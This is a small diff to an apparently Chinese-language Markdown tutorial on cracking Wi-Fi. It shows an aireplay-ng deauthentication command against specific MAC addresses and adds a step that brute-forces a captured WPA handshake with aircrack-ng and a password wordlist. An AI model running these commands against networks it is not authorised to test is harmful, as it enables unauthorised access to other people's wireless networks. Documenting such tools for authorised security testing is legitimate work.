@@ -47,4 +47,7 @@ tags:
 ```shell
  # aireplay-ng -0 10  -a FE:7C:02:54:57:AD -c EC:89:14:68:61:17  wlp3s0mon
 ```
-1. 检查握手包
+1. 检查利用密码词典暴力破解
+```shell
+ aircrack-ng data-01.cap -w ./crackstation-human-only.txt
+```
